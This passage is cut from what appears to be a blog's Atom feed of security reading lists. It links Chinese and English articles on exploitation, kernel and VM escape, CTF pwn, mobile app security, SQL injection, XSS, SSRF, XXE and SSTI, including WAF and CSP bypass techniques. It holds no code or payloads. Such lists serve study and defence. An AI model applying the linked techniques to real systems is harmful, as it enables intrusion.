<li><a href="http://bobao.360.cn/learning/detail/3219.html" target="_blank" rel="external">溢出利用FILE结构体</a></li>
</ul>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><ul>
<li><a href="http://blog.csdn.net/wuxiaobingandbob/article/details/44618925" target="_blank" rel="external">整数溢出漏洞</a></li>
</ul>
<h2 id="保护绕过"><a href="#保护绕过" class="headerlink" title="保护绕过"></a>保护绕过</h2><h3 id="Cannary绕过"><a href="#Cannary绕过" class="headerlink" title="Cannary绕过"></a>Cannary绕过</h3><ul>
<li><a href="http://0x48.pw/2017/03/14/0x2d/" target="_blank" rel="external">栈溢出之绕过CANARY保护 </a></li>
<li><a href="http://veritas501.space/2017/04/28/论canary的几种玩法/" target="_blank" rel="external">论canary的几种玩法</a></li>
<li><a href="http://yunnigu.dropsec.xyz/2017/03/20/Liunx下关于绕过cancry保护总结/" target="_blank" rel="external">Liunx下关于绕过cancry保护总结</a></li>
</ul>
<h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><ul>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="external">HackSysExtremeVulnerableDriver</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/" target="_blank" rel="external">Starting with Windows Kernel Exploitation – part 1 – setting up the lab</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/" target="_blank" rel="external">Starting with Windows Kernel Exploitation – part 2 – getting familiar with HackSys Extreme Vulnerable Driver</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4002.html" target="_blank" rel="external">Windows内核利用之旅：熟悉HEVD（附视频演示）</a></li>
<li><a href="bobao.360.cn/learning/detail/3718.html">Windows 内核攻击：栈溢出</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3700.html" target="_blank" rel="external">Linux 内核漏洞利用教程（一）：环境配置</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="external">Linux 内核漏洞利用教程（二）：两个Demo</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3706.html" target="_blank" rel="external">Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目</a></li>
<li><a href="http://www.freebuf.com/articles/system/94198.html" target="_blank" rel="external">Linux内核ROP姿势详解(一) </a></li>
<li><a href="http://www.freebuf.com/articles/system/135402.html" target="_blank" rel="external">Linux内核ROP姿势详解（二）</a></li>
</ul>
<h2 id="虚拟机逃逸"><a href="#虚拟机逃逸" class="headerlink" title="虚拟机逃逸"></a>虚拟机逃逸</h2><ul>
<li><a href="http://bbs.pediy.com/thread-217997.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（一）</a></li>
<li><a href="http://bbs.pediy.com/thread-217999.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（二）</a></li>
<li><a href="http://bbs.pediy.com/thread-218045.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（三） </a></li>
</ul>
<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4070.html" target="_blank" rel="external">ARM 汇编基础速成1：ARM汇编以及汇编语言基础介绍</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4075.html" target="_blank" rel="external">ARM 汇编基础速成2：ARM汇编中的数据类型</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4082.html" target="_blank" rel="external">ARM 汇编基础速成3：ARM模式与THUMB模式</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4087.html" target="_blank" rel="external">ARM 汇编基础速成4：ARM汇编内存访问相关指令</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4097.html" target="_blank" rel="external">ARM 汇编基础速成5：连续存取</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4104.html" target="_blank" rel="external">ARM 汇编基础速成6：条件执行与分支</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4108.html" target="_blank" rel="external">ARM 汇编基础速成7：栈与函数</a></li>
</ul>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4131.html" target="_blank" rel="external">10种常见的进程注入技术的总结</a></li>
<li><a href="http://www.freebuf.com/articles/system/143640.html" target="_blank" rel="external">系统安全攻防战：DLL注入技术详解 </a></li>
</ul>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4213.html" target="_blank" rel="external">看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞</a></li>
</ul>
<h2 id="CTF中的pwn"><a href="#CTF中的pwn" class="headerlink" title="CTF中的pwn"></a>CTF中的pwn</h2><ul>
<li><a href="https://github.com/jmpews/pwn2exploit" target="_blank" rel="external">pwn &amp; exploit</a></li>
</ul>
<h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3300.html" target="_blank" rel="external">跟我入坑PWN第一章</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3339.html" target="_blank" rel="external">跟我入坑PWN第二章</a></li>
</ul>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">借助DynELF实现无libc的漏洞利用小结</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="external">what DynELF does basically </a></li>
<li><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="external">Finding Function’s Load Address </a></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><a href="https://github.com/stfpeak/CTF" target="_blank" rel="external">CTF总结</a></li>
<li><a href="http://skysider.com/?p=223" target="_blank" rel="external">pwn tips</a></li>
<li><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="external">CTF-pwn-tips</a></li>
<li><a href="http://www.angelwhu.com/blog/?p=460" target="_blank" rel="external">pwn 学习总结</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5559167.html" target="_blank" rel="external">CTF中做Linux下漏洞利用的一些心得</a></li>
<li><a href="http://drops.xmd5.com/static/drops/binary-6521.html" target="_blank" rel="external">linux常见漏洞利用技术实践</a></li>
</ul>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><ul>
<li><a href="http://0x48.pw/2017/08/01/0x36/" target="_blank" rel="external">堆溢出学习之0CTF 2017 Babyheap </a></li>
</ul>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/3189.html" target="_blank" rel="external">一道有趣的CTF PWN题</a></li>
<li><a href="https://github.com/1u4nx/Exploit-Exercises-Nebula" target="_blank" rel="external">Exploit-Exercises Nebula全攻略</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-16700.html" target="_blank" rel="external">三个白帽之从pwn me调试到Linux攻防学习</a></li>
</ul>
<h1 id="Android-Security"><a href="#Android-Security" class="headerlink" title="Android Security"></a>Android Security</h1><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><ul>
<li><a href="https://github.com/payatu/diva-android/" target="_blank" rel="external">DIVA Android</a></li>
</ul>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649846643&amp;idx=1&amp;sn=0286e8f1b3e6da0acbd129cb248eac2a" target="_blank" rel="external">Android安全项目入门篇</a></li>
</ul>
<h2 id="Skill"><a href="#Skill" class="headerlink" title="Skill"></a>Skill</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484642&amp;idx=1&amp;sn=d34ec8b6fc9b5a63b627316e13821b13&amp;chksm=ec1e34cadb69bddc80598c93a0aef429d0b1d668b4fc6e5e6b31a7a3ebfa713aafda1f1b8f7a&amp;scene=21#wechat_redirect" target="_blank" rel="external">Android App漏洞学习（一）</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484706&amp;idx=1&amp;sn=eb49d5f71f89fd4d2e3bec23c44c0ae6&amp;chksm=ec1e350adb69bc1c9f775bfaf997459e1cfa3beb065f553ed90fbd88220d7739487e9f7208bd#rd" target="_blank" rel="external">Android App漏洞学习（二） </a></li>
<li><a href="http://wiki.ioin.in/sort/android" target="_blank" rel="external">WIKI: Android</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484387&amp;idx=1&amp;sn=7264428205276452d40c1ef7b1ed0dcc&amp;chksm=ec1e33cbdb69badd00794f81caa43e5d62e0dc9bb7b9baa9d4c3c9eb64a3a0a18613356bf584#rd" target="_blank" rel="external">Android组件安全</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28107901" target="_blank" rel="external">通过 WebView 攻击 Android 应用</a></li>
</ul>
<h2 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a>Tool</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4254.html" target="_blank" rel="external">走到哪黑到哪——Android渗透测试三板斧</a></li>
<li><a href="http://www.4hou.com/penetration/6916.html" target="_blank" rel="external">Brida:将frida与burp结合进行移动app渗透测试</a></li>
</ul>
<h1 id="IOS-OSX-Securiy"><a href="#IOS-OSX-Securiy" class="headerlink" title="IOS/OSX Securiy"></a>IOS/OSX Securiy</h1><ul>
<li><a href="https://github.com/michalmalik/osx-re-101" target="_blank" rel="external">OSX/iOS reverse engineering</a></li>
</ul>
<h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="http://damnvulnerableiosapp.com/#trainings" target="_blank" rel="external">Damn Vulnerable iOS Application (DVIA)</a></li>
</ul>
<h3 id="Skill-1"><a href="#Skill-1" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://github.com/pandazheng/IosHackStudy" target="_blank" rel="external">IosHackStudy</a></li>
<li><a href="https://papers.put.as/ios/ios/" target="_blank" rel="external">Papers, Slides and Thesis Archive : iOS</a></li>
<li><a href="http://security.ios-wiki.com/" target="_blank" rel="external">ios-wiki: iOS Security</a></li>
<li><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf" target="_blank" rel="external">apple官方文档：iOS Security</a></li>
<li><a href="http://esoftmobile.com/2014/02/14/ios-security/" target="_blank" rel="external">iOS安全系列汇总</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/105" target="_blank" rel="external">浅谈iOS应用安全自动化审计</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/123098.html" target="_blank" rel="external">iOS安全审计入门</a></li>
<li><a href="http://blog.pangu.io/xkungfoo2015/" target="_blank" rel="external">iOS内核漏洞挖掘–fuzz&amp;代码审计</a></li>
</ul>
<h2 id="OSX"><a href="#OSX" class="headerlink" title="OSX"></a>OSX</h2><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="https://reverse.put.as/crackmes/" target="_blank" rel="external">OS X : Crackmes</a></li>
</ul>
<h3 id="Skill-2"><a href="#Skill-2" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://papers.put.as/macosx/macosx/" target="_blank" rel="external">Papers, Slides and Thesis Archive : Mac OS X</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Software-Security-Learning 学习资料&lt;br&gt;8月22日更新小记：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IOS板块增加: &lt;a href=&quot;https://github.com/pandazheng/IosHackStudy&quot;&gt;IosHackStudy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;堆相关知识增加： &lt;a href=&quot;http://0x48.pw/2017/08/07/0x37/&quot;&gt;malloc.c源码阅读之__libc_free&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Web-Security-Learning</title>
    <link href="http://yoursite.com/2017/08/19/Web-Security-Learning/"/>
    <id>http://yoursite.com/2017/08/19/Web-Security-Learning/</id>
    <published>2017-08-19T02:15:59.000Z</published>
    <updated>2017-08-21T00:23:02.820Z</updated>
    
    <content type="html"><![CDATA[<p>Web-Security-Learning 学习资料<br>8月21日更新：</p>
<ul>
<li>整合前端安全模块</li>
<li>新收录文章：<ul>
<li>前端安全；<a href="http://paper.seebug.org/130/?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">当代 Web 的 JSON 劫持技巧</a></li>
<li>提权： <a href="https://mp.weixin.qq.com/s/ERXOLhWo0-lJbMV143I8hA" target="_blank" rel="external">Windows提权系列中篇</a></li>
<li>杂：<a href="http://bobao.360.cn/learning/detail/4268.html" target="_blank" rel="external">如何通过恶意插件在Atom中植入后门</a></li>
</ul>
</li>
</ul>
<a id="more"></a>
<h1 id="Web-Security-Learning"><a href="#Web-Security-Learning" class="headerlink" title="Web-Security-Learning"></a>Web-Security-Learning</h1><p>项目地址：<a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></p>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">MySQL False注入及技巧总结</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">MySQL 注入攻击与防御</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484372&amp;idx=1&amp;sn=ffcc51a88c9acf96c312421b75fc2a26&amp;chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd" target="_blank" rel="external">sql注入学习总结 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3801.html" target="_blank" rel="external">SQL注入防御与绕过的几种姿势</a></li>
<li><a href="http://rcoil.me/2017/05/MySQL%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">MySQL偏门技巧</a></li>
<li><a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></li>
</ul>
<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><ul>
<li><a href="http://fuping.site/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/" target="_blank" rel="external">MSSQL DBA权限获取WEBSHELL的过程 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3807.html" target="_blank" rel="external">MSSQL 注入攻击与防御</a></li>
<li><a href="http://docs.ioin.in/writeup/cert.360.cn/_files_CLR_E5_9C_A8SQL_20Server_E4_B8_AD_E7_9A_84_E5_88_A9_E7_94_A8_E6_8A_80_E6_9C_AF_E5_88_86_E6_9E_90_pdf/index.pdf" target="_blank" rel="external">CLR在SQL Server中的利用技术分析</a></li>
</ul>
<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484788&amp;idx=1&amp;sn=8a53b1c64d864cd01bab095d97a17715&amp;chksm=ec1e355cdb69bc4a2535bc1a053bfde3ec1838d03936ba8e44156818e91bbec9b5b04a744005#rd" target="_blank" rel="external">postgresql数据库利用方式 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/4135.html" target="_blank" rel="external">PostgreSQL渗透测试指南</a></li>
</ul>
<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><ul>
<li><a href="http://www.mottoin.com/94341.html" target="_blank" rel="external">MongoDB安全 – PHP注入检测</a></li>
</ul>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
<li><a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank" rel="external">我的WafBypass之道（SQL注入篇）</a></li>
<li><a href="http://www.cnblogs.com/xiaozi/p/7275134.html" target="_blank" rel="external">Bypass 360主机卫士SQL注入防御</a></li>
<li><a href="https://mp.weixin.qq.com/s/ORsciwsBGQJhFdKqceprSw" target="_blank" rel="external">SQL注入之骚姿势小记</a></li>
<li><a href="http://www.freebuf.com/articles/web/137094.html" target="_blank" rel="external">CTF比赛中SQL注入的一些经验总结 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3855.html" target="_blank" rel="external">如何绕过WAF/NGWAF的libinjection实现SQL注入</a></li>
<li><a href="https://github.com/breakthenet/HackMe-SQL-Injection-Challenges" target="_blank" rel="external">HackMe-SQL-Injection-Challenges
</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-25397-1-1.html?from=sec" target="_blank" rel="external">绕过WAF注入</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-16134-1-1.html?from=sec" target="_blank" rel="external">bypassGET和POST的注入防御思路分享</a></li>
<li><a href="https://mp.weixin.qq.com/s/hBkJ1M6LRgssNyQyati1ng" target="_blank" rel="external">SQL注入的常规思路及奇葩技巧 </a></li>
<li><a href="https://www.exploit-db.com/papers/17934/" target="_blank" rel="external">Beyond SQLi: Obfuscate and Bypass</a></li>
</ul>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3557.html" target="_blank" rel="external">使用burp macros和sqlmap绕过csrf防护进行sql注入</a></li>
<li><a href="http://www.zerokeeper.com/web-security/sqlmap-usage-summary.html" target="_blank" rel="external">sqlmap 使用总结 </a></li>
<li><a href="http://www.lengbaikai.net/?p=110" target="_blank" rel="external">SQLmap tamper脚本注释</a></li>
<li><a href="http://www.4hou.com/system/6945.html" target="_blank" rel="external">通过Burp以及自定义的Sqlmap Tamper进行二次SQL注入</a></li>
</ul>
<h2 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3848.html" target="_blank" rel="external">漫谈同源策略攻防</a></li>
<li><a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="external">再谈同源策略 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1404.html?fpage=4" target="_blank" rel="external">跨域方法总结</a></li>
<li><a href="http://thief.one/2017/05/31/1/" target="_blank" rel="external">浅谈跨站脚本攻击与防御 </a></li>
<li><a href="http://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="external">跨站的艺术-XSS入门与介绍</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.49.ZP8rXN&amp;articleid=518" target="_blank" rel="external">Content Security Policy 入门教程</a></li>
<li><a href="http://lorexxar.cn/tags/csp/" target="_blank" rel="external">LoRexxar-CSP</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/196.html?fpage=7" target="_blank" rel="external">XSS小记</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/536.html?fpage=7" target="_blank" rel="external">XSS Bypass Cookbook</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1988.html" target="_blank" rel="external">从瑞士军刀到变形金刚—XSS攻击面拓展</a></li>
<li><a href="http://www.freebuf.com/vuls/142751.html" target="_blank" rel="external">我们要在任何可能的地方测试XSS漏洞 </a></li>
<li><a href="http://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/" target="_blank" rel="external">Alternative to Javascript Pseudo-Protocol</a></li>
<li><a href="http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html" target="_blank" rel="external">Bypassing CSP using polyglot JPEGs </a></li>
<li><a href="http://paper.seebug.org/91/" target="_blank" rel="external">Bypass unsafe-inline mode CSP</a></li>
<li><a href="https://brutelogic.com.br/blog/chrome-xss-auditor-svg-bypass/" target="_blank" rel="external">Chrome XSS Auditor – SVG Bypass</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1704.html" target="_blank" rel="external">Cross site scripting payload for fuzzing</a></li>
<li><a href="http://docs.ioin.in/writeup/wps2015.org/_2016_06_27__E4_B8_8D_E5_B8_B8_E8_A7_81_E7_9A_84xss_E5_88_A9_E7_94_A8_E6_8E_A2_E7_B4_A2_/index.html" target="_blank" rel="external">不常见的xss利用探索</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec" target="_blank" rel="external">XSS攻击另类玩法</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-17500-1-1.html?from=sec" target="_blank" rel="external">XSS易容术—-bypass之编码混淆篇+辅助脚本编写</a></li>
<li><a href="https://www.zhihu.com/question/20941818/answer/180842222?utm_source=qq&amp;utm_medium=social" target="_blank" rel="external">Chrome 是怎么过滤反射型 XSS 的呢？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU2NjE2NjIxNg==&amp;mid=2247483756&amp;idx=1&amp;sn=96ae19e53426d5088718b6d37996e700&amp;source=41#wechat_redirect" target="_blank" rel="external">Electron hack —— 跨平台 XSS </a></li>
<li><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank" rel="external">XSS without HTML: Client-Side Template Injection with AngularJS </a></li>
<li><a href="https://zhchbin.github.io/2016/04/09/Problems-Caused-by-URL-Redirection/" target="_blank" rel="external">一个URL跳转引发的一系列“惨案” </a></li>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87CSP%20form-action%E9%99%90%E5%88%B6.html" target="_blank" rel="external">利用反射型XSS二次注入绕过CSP form-action限制</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3592.html" target="_blank" rel="external">看我如何挖到GoogleMaps XSS漏洞并获得5000刀赏金</a></li>
<li><a href="https://blog.doyensec.com/2017/08/03/electron-framework-security.html" target="_blank" rel="external">Modern Alchemy: Turning XSS into RCE</a></li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul>
<li><a href="https://zhchbin.github.io/2016/01/31/CRLF-Injection-and-Bypass-WAF/" target="_blank" rel="external">CRLF Injection and Bypass Tencent WAF </a></li>
<li><a href="https://bbs.ichunqiu.com/thread-24127-1-1.html?from=sec" target="_blank" rel="external">用代码来细说Csrf漏洞危害以及防御</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/think-about-cookie-form-csrf-protected.html" target="_blank" rel="external">Cookie-Form型CSRF防御机制的不足与反思</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247484126&amp;idx=1&amp;sn=f437882b19bed8d99d0a00938accc0c8&amp;chksm=e89e2a06dfe9a310506419467ada63bee80f10c32267d0b11ea7d1f5491c5afdb344c5dac74e&amp;mpshare=1&amp;scene=23&amp;srcid=0614BOCQBHPjaS2IOtADI3PP#rd" target="_blank" rel="external">关于JSON CSRF的一些思考</a></li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><a href="http://paper.seebug.org/130/?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">当代 Web 的 JSON 劫持技巧</a></li>
</ul>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><ul>
<li><a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="external">Build Your SSRF Exploit Framework SSRF</a></li>
<li><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">SSRF攻击实例解析</a></li>
<li><a href="http://www.4o4notfound.org/index.php/author/1/" target="_blank" rel="external">SSRF漏洞分析与利用</a></li>
<li><a href="https://www.secpulse.com/archives/4747.html" target="_blank" rel="external">SSRF漏洞的挖掘经验</a></li>
<li><a href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="external">SSRF漏洞的利用与学习</a></li>
<li><a href="http://www.freebuf.com/articles/web/135342.html" target="_blank" rel="external">SSRF漏洞中绕过IP限制的几种方法总结</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3566.html" target="_blank" rel="external">利用ssrf漏洞获取google内部的dns信息</a></li>
<li><a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/" target="_blank" rel="external">What is Server Side Request Forgery (SSRF)?</a></li>
<li><a href="http://www.mottoin.com/95734.html" target="_blank" rel="external">DNS Rebinding技术绕过SSRF/代理IP限制</a></li>
<li><a href="https://phpinfo.me/2017/02/23/1438.html" target="_blank" rel="external">Discuz ssrf漏洞利用的几个python脚本</a></li>
<li><a href="http://bobao.360.cn/learning/detail/2889.html" target="_blank" rel="external">Discuz X系列门户文章功能SSRF漏洞挖掘与分析</a></li>
<li><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a></li>
<li><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">SSRF Tips</a></li>
</ul>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><ul>
<li><a href="http://thief.one/2017/06/20/1/" target="_blank" rel="external">浅谈XXE漏洞攻击与防御</a></li>
<li><a href="http://www.4o4notfound.org/index.php/archives/29/" target="_blank" rel="external">XXE漏洞分析</a></li>
<li><a href="http://www.hackersb.cn/hacker/211.html" target="_blank" rel="external">XML实体注入漏洞攻与防</a></li>
<li><a href="http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="external">XML实体注入漏洞的利用与学习</a></li>
<li><a href="http://le4f.net/post/xxe-injection-attack_and_prevent" target="_blank" rel="external">XXE注入:攻击与防御 - XXE Injection: Attack and Prevent</a></li>
<li><a href="http://www.mottoin.com/101806.html" target="_blank" rel="external">XXE (XML External Entity Injection) 漏洞实践</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1837.html" target="_blank" rel="external">黑夜的猎杀-盲打XXE</a></li>
<li><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="external">Hunting in the Dark - Blind XXE</a></li>
<li><a href="https://www.sans.org/freading-room/whitepapers/application/hands-on-xml-external-entity-vulnerability-training-module-34397" target="_blank" rel="external">XMLExternal Entity漏洞培训模块</a></li>
<li><a href="http://www.mottoin.com/86853.html" target="_blank" rel="external">如何挖掘Uber网站的XXE注入漏洞</a></li>
<li><a href="http://www.mottoin.com/88085.html" target="_blank" rel="external">XXE被提起时我们会想到什么</a></li>
<li><a href="http://www.mottoin.com/92794.html" target="_blank" rel="external">XXE漏洞的简单理解和测试</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3841.html" target="_blank" rel="external">XXE漏洞攻防之我见</a></li>
<li><a href="http://www.91ri.org/17052.html" target="_blank" rel="external">XXE漏洞利用的一些技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/360.html" target="_blank" rel="external">神奇的Content-Type——在JSON中玩转XXE攻击</a></li>
</ul>
<h2 id="JSONP注入"><a href="#JSONP注入" class="headerlink" title="JSONP注入"></a>JSONP注入</h2><ul>
<li><a href="http://www.freebuf.com/articles/web/126347.html" target="_blank" rel="external">JSONP注入解析 </a></li>
<li><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">JSONP 安全攻防技术</a></li>
<li><a href="http://www.cnblogs.com/vimsk/archive/2013/01/29/2877888.html" target="_blank" rel="external">一次关于JSONP的小实验与总结</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1571.html" target="_blank" rel="external">利用JSONP跨域获取信息</a></li>
<li><a href="https://segmentfault.com/a/1190000009577990" target="_blank" rel="external">关于跨域和jsonp的一些理解(新手向)</a></li>
</ul>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><ul>
<li><a href="http://www.freebuf.com/articles/web/88768.html" target="_blank" rel="external">乱弹Flask注入</a></li>
<li><a href="http://www.freebuf.com/vuls/83999.html" target="_blank" rel="external">服务端模板注入攻击 （SSTI）之浅析 </a></li>
<li><a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a></li>
<li><a href="http://www.freebuf.com/articles/web/136118.html" target="_blank" rel="external">Flask Jinja2开发中遇到的的服务端注入问题研究</a></li>
<li><a href="http://www.freebuf.com/articles/web/136180.html" target="_blank" rel="external">FlaskJinja2 开发中遇到的的服务端注入问题研究 II</a></li>
